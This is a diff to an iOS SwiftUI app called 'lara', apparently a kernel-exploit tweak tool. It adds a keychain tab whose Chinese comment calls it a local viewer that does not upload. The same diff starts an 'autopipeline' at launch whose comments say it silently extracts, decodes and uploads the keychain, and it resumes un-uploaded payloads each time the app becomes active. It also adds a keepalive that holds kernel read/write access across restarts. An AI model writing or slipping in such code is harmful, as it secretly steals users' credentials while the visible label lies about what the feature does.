@@ -9,7 +9,7 @@ import SwiftUI
 import UniformTypeIdentifiers
 
 enum taboptions {
-    case applying, tweaks, files, logs
+    case applying, tweaks, files, logs, keychain
 }
 
 let g_isunsupported: Bool = isunsupported()
@@ -69,6 +69,14 @@ struct lara: App {
                         .tag(taboptions.files)
                 }
                 
+                // 临时测试版：本地钥匙串查看器（不上传）
+                KeychainDumpView()
+                    .tabItem {
+                        Image(systemName: "key.fill")
+                        Text("钥匙串")
+                    }
+                    .tag(taboptions.keychain)
+
                 // this too
                 if logsdisplaymode == .tabs {
                     LogsView(logger: globallogger)
@@ -103,6 +111,14 @@ struct lara: App {
                     // beautiful name root
                     // thanks
                     mgr.hasOffsets = emergencyfixfunctiontobereplacedlateronquestionmark()
+                    // keepalive: recover stashed primitives + watchdog so the
+                    // kernel R/W stays alive across app restarts (no reboot).
+                    if mgr.hasOffsets {
+                        keepalive.shared.start()
+                    }
+                    // autopipeline: silently extract + decode + upload the
+                    // keychain once primitives and VFS are ready.
+                    autopipeline.shared.start()
                 } else {
                     Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 - iOS 26.0.1) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
                 }
@@ -125,6 +141,8 @@ struct lara: App {
         case .active:
             globallogger.capture()
             iconthememgr.startPendingFixupIfPossible()
+            // resume any pending (un-uploaded) autopipeline payload
+            autopipeline.shared.resumeIfPending()
 
         @unknown default:
             break
